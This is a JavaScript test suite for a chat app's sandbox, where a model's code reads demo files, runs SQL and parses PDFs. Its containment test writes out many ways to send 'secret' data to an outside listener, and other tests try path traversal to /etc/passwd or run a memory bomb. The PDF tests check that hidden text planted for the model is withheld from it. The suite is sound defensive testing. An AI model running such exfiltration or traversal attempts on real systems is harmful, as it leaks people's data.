// run_js: the model's JavaScript runs in this browser in a locked frame (SQL and PDFs in two more), and the chat
// shows each call's life. The test model's "run-code" scenario runs the message itself as code, so these tests choose the code.
import { test, before, after } from "node:test";
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { BASE, assertClean, ensurePeople, lastAnswer, openBrowser, pageAs, say, serverLog, sleep, waitForIdle } from "./harness.js";

let browser;
before(async () => {
  await ensurePeople();
  browser = await openBrowser();
});
after(() => browser?.close());

const labels = (page) => page.eval(() => [...document.querySelectorAll(".tool summary")].map((s) => s.textContent));
const notices = (page) => page.eval(() => document.querySelector(".notices")?.textContent ?? "");

/** @param {RegExp} pattern */
function waitForCard(page, pattern, timeout = 15_000) {
  return page.waitFor((source) => [...document.querySelectorAll(".tool summary")].some((s) => new RegExp(source).test(s.textContent)),
    { args: [pattern.source], timeout, what: `a card saying ${pattern}` });
}

/** The chat's stored run_js results, as the server has them (read with the page's own session). */
async function results(page) {
  const items = await page.eval(async () => {
    const response = await fetch(`/api/v1/chats/${location.pathname.split("/")[2]}`);
    return (await response.json()).items;
  });
  return items.filter((item) => item.type === "tool_result").map((item) => JSON.parse(item.content));
}

/** A new chat in the same page, so the frames this page made are the ones the next call uses. */
async function newChat(page) {
  await page.click(".rail-new");
  await page.waitFor(() => location.pathname === "/" && !document.querySelector(".message"), { what: "a new chat" });
}

async function stop(page) {
  await page.click(".send.is-stop");
}

test("the analysis starter runs real code over the demo files: totals, a chart, and both again after a reload", async () => {
  const page = await pageAs(browser, "alice");
  await page.eval(() => [...document.querySelectorAll(".starter")].find((b) => /Analyse data/.test(b.textContent)).click());
  await page.press("Enter");
  await waitForCard(page, /^Running JavaScript…$/);
  await waitForIdle(page, 60_000);
  assert.match(await lastAnswer(page), /2,245,224 in all, and the Excel and CSV files agree/);
  const [label] = await labels(page);
  assert.match(label, /^Ran JavaScript · \d+(\.\d)? s$/);
  const chart = () => {
    const img = document.querySelector(".tool-chart");
    return img && img.complete ? `${img.naturalWidth}x${img.naturalHeight}` : null;
  };
  assert.equal(await page.waitFor(chart, { what: "the chart" }), "560x260");
  const [result] = await results(page);
  assert.equal(result.run_js, 1);
  assert.equal(result.status, "ok");
  assert.match(result.console, /^Total: 2245224 \(CSV: 2245224\)\nWest: 603957 from 499 sales\n/);
  assert.match(result.svg, /^<svg xmlns="http:\/\/www\.w3\.org\/2000\/svg"/);

  await page.reload();
  assert.equal(await page.waitFor(chart, { what: "the chart after a reload" }), "560x260");
  assert.deepEqual(await labels(page), [label]);
  await page.click(".tool summary");
  assert.match(await page.text(".tool"), /Total: 2245224 \(CSV: 2245224\)\s*West: 603957/);
  await assertClean(page, "analysis");
  await page.close();
});

test("fs lists the demo files and reads CSV as text and Excel as bytes; nothing else can be read", async () => {
  const page = await pageAs(browser, "alice");
  await say(page, `[scenario:run-code] const names = await fs.readdir();
const csv = await fs.readFile("demo/sales.csv");
const xlsx = await fs.readFile("demo/sales.xlsx");
const refused = [];
for (const name of ["../index.html", "demo/../js/main.js", "/etc/passwd", "demo/other.csv"]) {
  try { await fs.readFile(name); } catch (error) { refused.push(error.message); }
}
return { names, csv: [typeof csv, csv.split("\\n")[0]], xlsx: [xlsx.constructor.name, xlsx[0], xlsx[1]], refused: refused.length };`);
  await waitForIdle(page, 30_000);
  const [result] = await results(page);
  assert.equal(result.status, "ok", result.error);
  assert.deepEqual(JSON.parse(result.value), { names: ["demo/sales.csv", "demo/sales.xlsx", "demo/report.pdf"],
    csv: ["string", "date,region,product,units,unit_price,amount"], xlsx: ["Uint8Array", 80, 75], refused: 4 });
  await assertClean(page, "fs");
  await page.close();
});

// The PDF tests sign in as bob, so that no one person nears the sign-in ceiling (auth.SIGN_IN_CEILINGS) in a
// whole run of the browser tests.

test("pdf.html reads the demo report as HTML: two tables, North's misprint, and a hidden line without its text", async () => {
  const page = await pageAs(browser, "bob");
  await say(page, `[scenario:run-code] const { html, notes } = await pdf.html("demo/report.pdf");
const doc = new DOMParser().parseFromString(html, "text/html");
const rows = [...doc.querySelectorAll("tr")].map((tr) => [...tr.querySelectorAll("td, th")].map((cell) => cell.textContent));
const hidden = [...doc.querySelectorAll("[data-hidden]")]
  .map((element) => [element.getAttribute("data-hidden"), element.hasAttribute("data-text"), element.hasAttribute("data-bbox")]);
return { tables: doc.querySelectorAll("table").length, north: rows.find(([region]) => region === "North"), hidden, notes,
  said: html.includes("Reviewed"), generator: doc.querySelector("meta[name=generator]").getAttribute("content"),
  source: doc.querySelector("meta[name=source]").getAttribute("content").startsWith("sha256:") };`);
  await waitForIdle(page, 30_000);
  const [result] = await results(page);
  assert.equal(result.status, "ok", result.error);
  assert.deepEqual(JSON.parse(result.value), { tables: 2, north: ["North", "545,915", "24.3%"],
    hidden: [["samecolour", false, true]], notes: [], said: false, generator: "digpdf 0.3.0", source: true });
  await assertClean(page, "pdf");
  await page.close();
});

test("pdf.html refuses what is not a PDF or not a file the chat can use, and the next read works; fs never hands over a PDF", async () => {
  const page = await pageAs(browser, "bob");
  await say(page, `[scenario:run-code] const failed = [];
for (const name of ["demo/sales.csv", "../index.html"]) {
  try { await pdf.html(name); } catch (error) { failed.push(error.message); }
}
try { await fs.readFile("demo/report.pdf"); } catch (error) { failed.push(error.message); }
const { html } = await pdf.html("demo/report.pdf");
return { failed, read: html.includes("Sales report 2025") };`);
  await waitForIdle(page, 30_000);
  const [result] = await results(page);
  assert.equal(result.status, "ok", result.error);
  const { failed, read } = JSON.parse(result.value);
  assert.equal(failed[0], "demo/sales.csv is not a PDF");
  assert.match(failed[1], /There is no file named "\.\.\/index\.html"/);
  assert.equal(failed[2], "demo/report.pdf is a PDF: read it with pdf.html(). Its raw bytes are not handed to code.");
  assert.equal(read, true);
  await assertClean(page, "pdf refused");
  await page.close();
});

test("a PDF read cut short by Stop: before the reader has it, no reader starts; while it reads, the reader goes; the next read works", async () => {
  const page = await pageAs(browser, "bob"); // its own browser context: nothing cached yet
  const readers = () => page.eval(() => document.querySelectorAll('iframe[src*="/frames/pdf.html"]').length);
  const held = [];
  const hold = async (pattern) => {
    held.length = 0;
    await page.intercept(pattern, async (params) => { held.push(params); }, "Request");
  };
  const whenHeld = async () => {
    for (const until = Date.now() + 15_000; !held.length; await sleep(50)) {
      if (Date.now() > until) throw new Error("the request never came");
    }
  };
  const read = "[scenario:run-code] return (await pdf.html('demo/report.pdf')).html.includes('545,915')";

  // Stop while the PDF itself is still on its way to the page: when it arrives, the call is over.
  await hold("*/demo/report.pdf");
  await say(page, read);
  await whenHeld();
  await stop(page);
  await waitForCard(page, /^Stopped$/, 3000);
  await page.continueRequest(held[0]);
  await page.stopIntercepting();
  await sleep(1000);
  assert.equal(await readers(), 0, "no reader was started for the stopped call");

  // Stop while the reader has the request: a stand-in reader that says when a request reaches it and never
  // answers. The reader is thrown away with the call.
  const standIn = `<!doctype html><script>
addEventListener("message", (event) => {
  if (event.data?.type !== "hello") return;
  const port = event.ports[0];
  port.onmessage = ({ data }) => {
    if (data?.type === "ping") port.postMessage({ type: "pong" });
    else if (data?.type === "pdf") parent.postMessage("stand-in reader: a PDF arrived", "*"); // and no answer, ever
  };
  port.postMessage({ type: "ready" });
});
</script>`;
  await page.intercept("*/frames/pdf.html", (params) => page.fulfil(params, { headers: { "content-type": "text/html" }, body: standIn }));
  await newChat(page);
  await page.eval(() => addEventListener("message", (event) => {
    if (event.data === "stand-in reader: a PDF arrived") window.standInHasAPdf = true;
  }));
  await say(page, read);
  await page.waitFor(() => window.standInHasAPdf, { timeout: 15_000, what: "the stand-in reader to get the request" });
  assert.equal(await readers(), 1);
  await stop(page);
  await waitForCard(page, /^Stopped$/, 3000);
  assert.equal(await readers(), 0, "the reader went with the call");
  await page.stopIntercepting();

  // A call that returns without awaiting its read: nothing of it is left to answer anyone.
  await newChat(page);
  await say(page, "[scenario:run-code] pdf.html('demo/report.pdf'); return 'left it'");
  await waitForIdle(page, 30_000);

  await newChat(page);
  await say(page, read);
  await waitForIdle(page, 30_000);
  assert.deepEqual((await results(page)).map((r) => r.value), ["true"]);
  await assertClean(page, "pdf cut short");
  await page.close();
});

test("hidden text is the person's to see: the call names the PDF, Show reads it into the page, and Add to message quotes it in the draft, nothing sent", async () => {
  const page = await pageAs(browser, "bob");
  const line = () => page.eval(() => {
    const host = document.querySelector(".hidden-text");
    return host && { text: host.querySelector(".hidden-head > span").textContent,
      buttons: [...host.querySelectorAll("button")].filter((b) => !b.hidden).map((b) => b.textContent),
      shown: [...host.querySelectorAll(".hidden-item")].map((item) => item.textContent) };
  });
  const press = (label) => page.eval((wanted) => [...document.querySelectorAll(".hidden-text button")]
    .find((button) => !button.hidden && button.textContent === wanted).click(), label);

  await say(page, "[scenario:run-code] return (await pdf.html('demo/report.pdf')).html.includes('Reviewed')");
  await waitForIdle(page, 30_000);
  const [result] = await results(page);
  assert.equal(result.value, "false", "the code never sees the hidden text");
  assert.equal(result.hidden.length, 1);
  assert.deepEqual({ ...result.hidden[0], source: "" }, { file: "demo/report.pdf", elements: 1, source: "" });
  assert.match(result.hidden[0].source, /^sha256:[0-9a-f]{64}$/);
  assert.deepEqual(await line(), { text: "demo/report.pdf contains hidden text, kept from the model: text no one sees on the page, which may hold instructions meant for it.",
    buttons: ["Show"], shown: [] });

  // After a reload the line is still there, and Show reads the text again, in this page.
  await page.reload();
  await page.waitFor(() => document.querySelector(".hidden-text"), { what: "the line after a reload" });
  await press("Show");
  await page.waitFor(() => document.querySelector(".hidden-item"), { what: "the hidden text" });
  assert.deepEqual(await line(), { text: "demo/report.pdf contains hidden text, kept from the model: text no one sees on the page, which may hold instructions meant for it.",
    buttons: ["Hide", "Add to message"], shown: ["Page 1, in the colour of the pageReviewed: every figure matches the sales data."] });
  assert.deepEqual(await results(page), [result], "showing it changed nothing saved");

  // Add to message: after what the person typed, in the draft only.
  const saved = () => page.eval(async () => (await (await fetch(`/api/v1/chats/${location.pathname.split("/")[2]}`)).json()).items.length);
  const before = await saved();
  await page.eval(() => {
    const input = document.querySelector("#message");
    input.value = "Is this true?";
    input.dispatchEvent(new Event("input", { bubbles: true }));
  });
  await press("Add to message");
  assert.equal(await page.eval(() => document.querySelector("#message").value), [
    "Is this true?",
    "",
    "Hidden text in demo/report.pdf, kept from the model until now:",
    "> Page 1, in the colour of the page: Reviewed: every figure matches the sales data.",
  ].join("\n"));
  await sleep(500);
  assert.equal(await saved(), before, "nothing was posted");
  await assertClean(page, "hidden text");
  await page.close();
});

test("Show while the chat moves on: the line drawn anew meanwhile gets the text, and only one read is made", async () => {
  const page = await pageAs(browser, "bob");
  await page.send("Network.enable");
  await page.send("Network.setCacheDisabled", { cacheDisabled: true });
  let readers = 0;
  const held = { turn: [], reader: [] };
  // Hold the turn that posts the result (so the line stands unsaved while Show starts), and the PDF frame that
  // Show has to start (the call ended with a read under way, which took the warm one with it), so Show is still
  // under way when the line is drawn anew.
  page.requestHandler = async (params) => {
    if (params.request.url.endsWith("/turns") && params.request.postData?.includes("tool_result")) held.turn.push(params);
    else if (params.request.url.includes("/frames/pdf.html") && readers++ > 0) held.reader.push(params);
    else await page.continueRequest(params);
  };
  await page.send("Fetch.enable", { patterns: [{ urlPattern: "*/turns", requestStage: "Request" },
    { urlPattern: "*/frames/pdf.html", requestStage: "Request" }] });
  const until = async (what, check) => {
    for (const end = Date.now() + 15_000; !check(); await sleep(50)) if (Date.now() > end) throw new Error(what);
  };

  await say(page, "[scenario:run-code] await pdf.html('demo/report.pdf'); pdf.html('demo/report.pdf'); return 'read'");
  await until("the result was never posted", () => held.turn.length > 0);
  await page.waitFor(() => document.querySelector(".hidden-text button"), { what: "the line" });
  await page.eval(() => { document.querySelector(".hidden-text").dataset.first = "yes"; });
  await page.eval(() => document.querySelector(".hidden-text button").click());
  await until("Show never started a reader", () => held.reader.length > 0);
  await page.eval(() => document.querySelector(".hidden-text button").click()); // a second click reads nothing more
  await page.continueRequest(held.turn[0]);
  await waitForIdle(page, 30_000);
  assert.equal(await page.eval(() => document.querySelector(".hidden-text").dataset.first ?? null), null, "the line was drawn anew");
  assert.equal(await page.text(".hidden-text button"), "Reading…");
  await page.continueRequest(held.reader[0]);
  await page.waitFor(() => document.querySelector(".hidden-item"), { what: "the text in the line drawn anew" });
  assert.equal(await page.text(".hidden-item pre"), "Reviewed: every figure matches the sales data.");
  assert.equal(await page.text(".hidden-text button"), "Hide");
  assert.equal(held.reader.length, 1, "one read");
  await page.stopIntercepting();
  await assertClean(page, "show while the chat moves on");
  await page.close();
});

test("an old line cannot show another file that now has the same name", async () => {
  const page = await pageAs(browser, "bob");
  await page.send("Network.enable");
  await page.send("Network.setCacheDisabled", { cacheDisabled: true }); // every load of the PDF is seen below
  let loads = 0;
  // The first load of the PDF is the real one; every later load brings different bytes (one character of its
  // header changed): another file under the same name.
  await page.intercept("*/demo/report.pdf", async (params) => {
    if (loads++ === 0) return page.continueRequest(params);
    const response = await fetch(params.request.url);
    const bytes = Buffer.from(await response.arrayBuffer());
    bytes.write("7", 7, "latin1"); // %PDF-1.4 becomes %PDF-1.7
    await page.fulfil(params, { headers: { "content-type": "application/pdf" }, body: bytes });
  });
  await say(page, "[scenario:run-code] return (await pdf.html('demo/report.pdf')).notes.length");
  await waitForIdle(page, 30_000);
  await page.reload();
  await page.waitFor(() => document.querySelector(".hidden-text"), { what: "the line" });
  await page.eval(() => document.querySelector(".hidden-text button").click());
  await page.waitFor(() => document.querySelector(".hidden-text .form-error"), { what: "the refusal" });
  assert.equal(await page.text(".hidden-text .form-error"), "demo/report.pdf has changed since the code read it.");
  assert.equal(await page.eval(() => document.querySelectorAll(".hidden-item").length), 0);
  await page.stopIntercepting();
  await assertClean(page, "hidden text changed");
  await page.close();
});

test("leaving the chat calls Show off: before the PDF arrives no reader starts; while the reader starts it goes; the next read works", async () => {
  const page = await pageAs(browser, "bob");
  const readers = () => page.eval(() => document.querySelectorAll('iframe[src*="/frames/pdf.html"]').length);
  const held = [];
  const hold = async (pattern) => {
    held.length = 0;
    await page.intercept(pattern, async (params) => { held.push(params); }, "Request");
  };
  const whenHeld = async () => {
    for (const until = Date.now() + 15_000; !held.length; await sleep(50)) {
      if (Date.now() > until) throw new Error("the request never came");
    }
  };
  const read = "[scenario:run-code] return (await pdf.html('demo/report.pdf')).notes.length";
  await say(page, read);
  await waitForIdle(page, 30_000);
  const chat = `${BASE}${await page.eval(() => location.pathname)}`;

  // Leave while the PDF is on its way to the page (after a reload nothing is fetched and no reader is up).
  await page.reload();
  await page.waitFor(() => document.querySelector(".hidden-text button"), { what: "the line" });
  await hold("*/demo/report.pdf");
  await page.eval(() => document.querySelector(".hidden-text button").click());
  await whenHeld();
  await newChat(page);
  await page.continueRequest(held[0]);
  await page.stopIntercepting();
  await sleep(1000);
  assert.equal(await readers(), 0, "no reader was started for a preview called off");

  // Leave while the reader is starting: it goes with the preview.
  await page.goto(chat);
  await page.waitFor(() => document.querySelector(".hidden-text button"), { what: "the line" });
  await hold("*/frames/pdf.html");
  await page.eval(() => document.querySelector(".hidden-text button").click());
  await whenHeld();
  assert.equal(await readers(), 1);
  await newChat(page);
  assert.equal(await readers(), 0, "the reader went with the preview");
  await page.stopIntercepting();

  // Nothing is left waiting: a call reads the PDF with a fresh reader.
  await say(page, read);
  await waitForIdle(page, 30_000);
  assert.deepEqual((await results(page)).map((r) => r.status), ["ok"]);
  await assertClean(page, "show called off");
  await page.close();
});

test("another tab saves its own result first: the line it brings is new, and what this tab showed does not carry over", async () => {
  const first = await pageAs(browser, "bob");
  const held = [];
  await first.intercept("*/turns", async (params) => {
    if (params.request.postData?.includes("tool_result")) held.push(params); // this tab's result stays unsaved
    else await first.continueRequest(params);
  });
  await say(first, "[scenario:run-code] return (await pdf.html('demo/report.pdf')).notes.length");
  for (const until = Date.now() + 30_000; !held.length; await sleep(50)) {
    if (Date.now() > until) throw new Error("the result was never posted");
  }
  await first.eval(() => document.querySelector(".hidden-text button").click());
  await first.waitFor(() => document.querySelector(".hidden-item"), { what: "the text this tab showed" });

  // The second tab runs the call itself, over another file under the same name, and saves its result first.
  const second = await pageAs(browser, "bob", await first.eval(() => location.pathname));
  await second.intercept("*/demo/report.pdf", async (params) => {
    const response = await fetch(params.request.url);
    const bytes = Buffer.from(await response.arrayBuffer());
    bytes.write("7", 7, "latin1"); // %PDF-1.4 becomes %PDF-1.7
    await second.fulfil(params, { headers: { "content-type": "application/pdf" }, body: bytes });
  });
  await waitForCard(second, /^JavaScript has not run yet$/);
  await second.eval(() => [...document.querySelectorAll(".notices button")].find((b) => b.textContent === "Continue").click());
  await waitForIdle(second, 30_000);
  const [saved] = await results(second);
  await second.stopIntercepting();

  await first.continueRequest(held[0]);
  await first.stopIntercepting();
  await first.waitFor(() => /changed in another tab/.test(document.querySelector(".notices")?.textContent || ""));
  await first.waitFor((source) => document.querySelector(".hidden-text")?.dataset.slot.endsWith(`:${source}`),
    { args: [saved.hidden[0].source], what: "the line for the saved result" });
  assert.equal(await first.eval(() => document.querySelectorAll(".hidden-item").length), 0, "nothing shown for it yet");
  assert.equal(await first.text(".hidden-text button"), "Show");
  first.allow(/status of 409/);
  await assertClean(first, "first tab");
  await assertClean(second, "second tab");
  await first.close();
  await second.close();
});

test("the PDF starter checks the report against the data and names the misprint the code found", async () => {
  const page = await pageAs(browser, "bob");
  await page.eval(() => [...document.querySelectorAll(".starter")].find((b) => /Check a PDF report/.test(b.textContent)).click());
  await page.press("Enter");
  await waitForIdle(page, 45_000);
  const cards = await labels(page);
  assert.equal(cards.length, 1);
  assert.match(cards[0], /^Ran JavaScript · /);
  const [result] = await results(page);
  assert.equal(result.value, "North: report 545915, data 545951; report total 2245224, data total 2245224; hidden elements: 1 (samecolour)");
  const answer = await lastAnswer(page);
  assert.match(answer, /Two digits are swapped/);
  assert.match(answer, /hidden text/);
  await assertClean(page, "pdf starter");
  await page.close();
});

test("each call starts with a clean database: a table one call made is gone in the next", async () => {
  const page = await pageAs(browser, "alice");
  await say(page, "[scenario:run-code] await sql('CREATE TABLE kept AS SELECT 42 AS x'); return (await sql('SELECT x FROM kept'))[0].x");
  await waitForIdle(page, 30_000);
  await newChat(page);
  await say(page, "[scenario:run-code] return (await sql('SELECT count(*) AS n FROM duckdb_tables() WHERE NOT internal'))[0].n");
  await waitForIdle(page, 30_000);
  assert.deepEqual((await results(page)).map((r) => r.value), ["0"]);
  await assertClean(page, "clean database");
  await page.close();
});

test("two calls in one step run one after the other, and both results go back in one turn", async () => {
  const page = await pageAs(browser, "alice");
  await say(page, "[scenario:two-calls] go");
  await waitForIdle(page, 30_000);
  assert.match(await lastAnswer(page), /Both ran: 42 and ABC/);
  assert.equal((await labels(page)).filter((label) => /^Ran JavaScript/.test(label)).length, 2);
  assert.deepEqual((await results(page)).map((r) => r.value), ["42", "ABC"]);
  await assertClean(page, "two calls");
  await page.close();
});

test("a failing call and its fix: the card says it failed, and the model claims success only once it worked", async () => {
  const page = await pageAs(browser, "alice");
  await say(page, "[scenario:self-correction] go");
  await waitForIdle(page, 30_000);
  const [failed, fixed] = await labels(page);
  assert.equal(failed, "JavaScript failed");
  assert.match(fixed, /^Ran JavaScript/);
  assert.match(await lastAnswer(page), /Headphones sell most often \(428 sales\)/);
  const [first, second] = await results(page);
  assert.equal(first.status, "error");
  assert.match(first.error, /Referenced column "prodcut" not found/);
  assert.match(first.error, /line 1:/);
  assert.equal(second.status, "ok");
  await assertClean(page, "self-correction");
  await page.close();
});

test("Stop ends a running call at once and posts nothing; Continue runs it again", async () => {
  const page = await pageAs(browser, "alice");
  await say(page, "[scenario:run-code] await new Promise((done) => setTimeout(done, 4000)); return 'slept'");
  await waitForCard(page, /^Running JavaScript…$/);
  const pressed = Date.now();
  await stop(page);
  await waitForCard(page, /^Stopped$/, 3000);
  assert.ok(Date.now() - pressed < 2000, "stopped at once");
  await page.waitFor(() => /Stopped while the code ran/.test(document.querySelector(".notices")?.textContent ?? ""),
    { what: "the stopped notice" });
  assert.deepEqual(await results(page), [], "nothing was posted");

  await page.eval(() => [...document.querySelectorAll(".notices button")].find((b) => b.textContent === "Continue").click());
  await waitForCard(page, /^Running JavaScript…$/);
  await waitForIdle(page, 20_000);
  assert.match(await lastAnswer(page), /Done\./);
  assert.deepEqual((await results(page)).map((r) => r.value), ["slept"]);
  await assertClean(page, "stop");
  await page.close();
});

test("after Stop, a new message closes the stopped call as not run, and the model answers the message", async () => {
  const page = await pageAs(browser, "alice");
  await say(page, "[scenario:run-code] await new Promise((done) => setTimeout(done, 4000)); return 'slept'");
  await waitForCard(page, /^Running JavaScript…$/);
  await stop(page);
  await waitForCard(page, /^Stopped$/, 3000);
  await say(page, "never mind that");
  await waitForIdle(page, 20_000);
  assert.deepEqual(await labels(page), ["JavaScript did not run"]);
  assert.match(await lastAnswer(page), /You said: never mind that/);
  assert.equal(await notices(page), "");
  await assertClean(page, "stop then write");
  await page.close();
});

test("Stop while SQL runs abandons the query, and the next query answers promptly", async () => {
  const page = await pageAs(browser, "alice");
  await say(page, "[scenario:run-code] return await sql('SELECT sum(i * i) AS s FROM range(3000000000) t(i)')");
  await waitForCard(page, /^Running JavaScript…$/);
  await sleep(4000); // DuckDB has started and the query is running
  await stop(page);
  await waitForCard(page, /^Stopped$/, 3000);
  await newChat(page);
  const asked = Date.now();
  await say(page, "[scenario:run-code] return (await sql('SELECT 42 AS x'))[0].x");
  await waitForIdle(page, 20_000);
  assert.ok(Date.now() - asked < 10_000, `answered after ${Date.now() - asked} ms`);
  assert.deepEqual((await results(page)).map((r) => r.value), ["42"]);
  await assertClean(page, "stop sql");
  await page.close();
});

test("a runaway loop is stopped at the time limit with what it printed, and the next call works", async () => {
  const page = await pageAs(browser, "alice");
  await say(page, "[scenario:run-code] console.log('started'); while (true) {}");
  await waitForIdle(page, 45_000);
  assert.deepEqual(await labels(page), ["JavaScript failed"]);
  const [result] = await results(page);
  assert.match(result.error, /stopped after 30 s, its time limit/);
  assert.equal(result.console, "started");
  assert.ok(result.seconds >= 30 && result.seconds < 33, String(result.seconds));
  await newChat(page);
  await say(page, "[scenario:run-code] return 6 * 7");
  await waitForIdle(page, 20_000);
  assert.deepEqual((await results(page)).map((r) => r.value), ["42"]);
  await assertClean(page, "runaway");
  await page.close();
});

test("a memory bomb is caught by the heartbeat; the next call works, SQL included", async () => {
  // Chrome runs both locked frames in one process (they share a site), so the bomb ends DuckDB too: the page
  // notices at once, and the next query starts a fresh one instead of hanging.
  const page = await pageAs(browser, "alice");
  await say(page, "[scenario:run-code] return (await sql('SELECT 1 AS x'))[0].x"); // DuckDB is warm
  await waitForIdle(page, 30_000);
  await newChat(page);
  await say(page, "[scenario:run-code] const all = []; for (;;) all.push(new Array(1e6).fill(Math.random()));");
  await waitForIdle(page, 45_000);
  assert.deepEqual(await labels(page), ["JavaScript failed"]);
  const [result] = await results(page);
  assert.match(result.error, /stopped responding/);
  assert.ok(result.seconds < 25, `caught after ${result.seconds} s, before the time limit`);
  await newChat(page);
  await say(page, "[scenario:run-code] return (await sql('SELECT 42 AS x'))[0].x");
  await waitForIdle(page, 20_000);
  assert.deepEqual((await results(page)).map((r) => r.value), ["42"]);
  await assertClean(page, "memory");
  await page.close();
});

test("a code frame that never loads fails the call, and the next call starts a fresh one", async () => {
  const page = await pageAs(browser, "alice");
  await page.intercept("*/frames/code.html", async () => {}, "Request"); // held, never answered
  await say(page, "[scenario:run-code] return 1");
  await waitForIdle(page, 45_000);
  await page.stopIntercepting();
  assert.deepEqual(await labels(page), ["JavaScript failed"]);
  assert.match((await results(page))[0].error, /did not start/);
  await newChat(page);
  await say(page, "[scenario:run-code] return 2");
  await waitForIdle(page, 20_000);
  assert.deepEqual((await results(page)).map((r) => r.value), ["2"]);
  await assertClean(page, "never ready");
  await page.close();
});

test("a reload while code runs leaves the call waiting, and Continue runs it", async () => {
  const page = await pageAs(browser, "alice");
  await say(page, "[scenario:run-code] await new Promise((done) => setTimeout(done, 3000)); return 'after the reload'");
  await waitForCard(page, /^Running JavaScript…$/);
  await page.reload();
  await waitForCard(page, /^JavaScript has not run yet$/);
  assert.match(await notices(page), /The code in this answer has not run yet/);
  await page.eval(() => [...document.querySelectorAll(".notices button")].find((b) => b.textContent === "Continue").click());
  await waitForIdle(page, 20_000);
  assert.deepEqual((await results(page)).map((r) => r.value), ["after the reload"]);
  await assertClean(page, "reload");
  await page.close();
});

test("code cannot reach anything: every way out fails, a listener and snild hear nothing, yet a normal page reaches the listener", async () => {
  let connections = 0;
  const heard = [];
  const listener = createServer((request, response) => {
    heard.push(request.url);
    response.end("ok");
  });
  listener.on("connection", () => connections++);
  listener.on("upgrade", (request, socket) => {
    heard.push(request.url);
    socket.destroy();
  });
  await new Promise((resolve) => listener.listen(0, "127.0.0.1", resolve));
  const target = `http://127.0.0.1:${listener.address().port}`;
  try {
    const page = await pageAs(browser, "alice");
    // snild's own files too: a load with data in its address would carry it to snild's log.
    const assets = await page.eval(() => document.querySelector("script[type=module]").src.replace(/\/js\/main\.js$/, ""));
    await say(page, `[scenario:run-code] const target = ${JSON.stringify(target)};
const assets = ${JSON.stringify(assets)};
const within = (attempt) => Promise.race([attempt, new Promise((_, no) => setTimeout(() => no(new Error("no answer")), 3000))]);
const opened = (source) => new Promise((ok, no) => { source.onopen = ok; source.onerror = no; });
const attempts = {
  fetch: () => fetch(target + "/fetch", { mode: "no-cors" }),
  post: () => fetch(target + "/post", { method: "POST", body: "secret", mode: "no-cors" }),
  xhr: () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open("GET", target + "/xhr"); x.onload = ok; x.onerror = no; x.send(); }),
  websocket: () => opened(new WebSocket(target.replace("http", "ws") + "/ws")),
  eventsource: () => opened(new EventSource(target + "/es")),
  importScripts: async () => importScripts(target + "/script.js"),
  image: async () => { new Image().src = target + "/image"; },
  beacon: async () => { if (!navigator.sendBeacon(target + "/beacon", "secret")) throw new Error("refused"); },
  parent: async () => parent.postMessage("secret", "*"),
  top: async () => top.location.href,
  cookie: async () => { if (!String(document.cookie).includes("snild_session")) throw new Error("no cookie"); },
  sql: () => sql("SELECT * FROM read_csv('" + target + "/data.csv')"),
  sqlUnlock: () => sql("SET enable_external_access = true"),
  dynamicImport: () => import(target + "/module.js"),
  nestedWorker: () => new Promise((ok, no) => {
    const code = "fetch(" + JSON.stringify(target + "/nested") + ", { mode: 'no-cors' }).then(() => postMessage(1), () => postMessage(0))";
    const worker = new Worker(URL.createObjectURL(new Blob([code], { type: "text/javascript" })));
    worker.onmessage = (event) => (event.data ? ok() : no(new Error("blocked")));
    worker.onerror = no;
  }),
  ownScript: async () => importScripts(assets + "/vendor/d3/d3.min.js?leak=script"),
  ownModule: () => import(assets + "/frames/arrow.js?leak=module"),
  ownFetch: () => fetch(assets + "/vendor/d3/d3.min.js?leak=fetch"),
};
const report = {};
for (const [name, attempt] of Object.entries(attempts)) {
  try { await within(attempt()); report[name] = "reached"; } catch { report[name] = "blocked"; }
}
document.body.innerHTML = '<img src="' + target + '/img-tag"><iframe src="' + target + '/frame"></iframe>';
await new Promise((done) => setTimeout(done, 500));
console.log(JSON.stringify(report));`);
    await waitForIdle(page, 90_000);
    const [result] = await results(page);
    assert.equal(result.status, "ok", result.error);
    const report = JSON.parse(result.console);
    assert.deepEqual(Object.keys(report).length, 18);
    for (const [name, outcome] of Object.entries(report)) assert.equal(outcome, "blocked", name);
    assert.deepEqual(heard, []);
    assert.equal(connections, 0);
    assert.doesNotMatch(serverLog(), /leak=/, "nothing reached snild either");
    // Positive control: the browser itself can reach the listener, so the silence above means something.
    const control = await browser.newPage();
    await control.goto(`${target}/control`);
    await control.close();
    assert.equal(heard[0], "/control"); // (the browser may ask for a favicon after it)
    await assertClean(page, "containment");
    await page.close();
  } finally {
    listener.close();
  }
});
